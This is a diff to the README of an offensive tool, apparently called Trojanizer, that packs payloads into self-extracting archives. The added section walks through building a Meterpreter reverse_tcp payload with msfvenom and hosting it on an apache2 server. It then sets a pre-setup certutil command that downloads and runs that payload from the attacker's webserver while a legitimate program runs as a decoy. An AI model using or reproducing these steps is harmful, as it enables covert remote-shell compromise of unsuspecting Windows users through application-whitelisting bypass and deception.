@@ -83,6 +83,44 @@
     **This setting will build sfx archives, but it does not behave like one trojan**
 ![Trojanizer v1.1-Beta](http://i.cubeupload.com/ptouUv.png)<br />
 
+
+<br /><br /><br />
+
+## TROJANIZER AND APPL WHITELISTING BYPASSES
+    ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
+    |   A lot of awesome work has been done by a lot of people, especially @subTee, regarding  application whitelisting  |
+    |   bypass, which is eventually what we want: execute arbitrary code abusing Microsoft built-in binaries.            |
+    | https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/ |
+    ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
+
+
+
+    The follow exercise describes how to use trojanizer and Presetup sfx build-in switch to drop and execute
+    any payload using 'certutil' appl whitelisting bypass method discover by @subTee and @enigma0x3 ..
+
+
+    1º - use metasploit to build our payload
+         msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f exe -o payload.exe
+
+    2º - copy payload.exe to apache2 webroot and start service
+         cp payload.exe /var/www/html/payload.exe
+         service apache2 start
+
+    3º - edit Trojanizer 'settings' file and activate:
+         PRE_SETUP=ON
+         SINGLE_EXEC=ON
+
+    4º - running trojanizer tool
+         PAYLOAD TO BE COMPRESSED => any_file (it will not matter what you compress)
+         script.bat (thats going to execute: any_file) => any_legit_appl.exe (to be executed as decoy)
+         PRESETUP FUNTION => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe' , '%TEMP%/payload.exe'; Start-Process '%TEMP%/payload.exe'
+
+    ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
+    |      When the sfx archive its executed, it will download payload.exe from our apache2 webserver to target and      |
+    |  execute it before extract 'any_file' and 'any_legit_appl.exe' (this last one will be executed to serve as decoy)  |
+    ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
+    
+
 <br /><br /><br />
 
 ## DOWNLOAD/INSTALL
@@ -117,7 +155,8 @@
 <br /><br /><br />
 
 ## Video tutorials
-![Trojanizer v1.1-Beta](http://i.cubeupload.com/xdZ.png)<br />
+**Trojanizer - single_file_execution (not trojan behavior)**<br />
+https://www.youtube.com/watch?v=Ze0JkVtKbns<br />
 
 
 ### Report bugs:
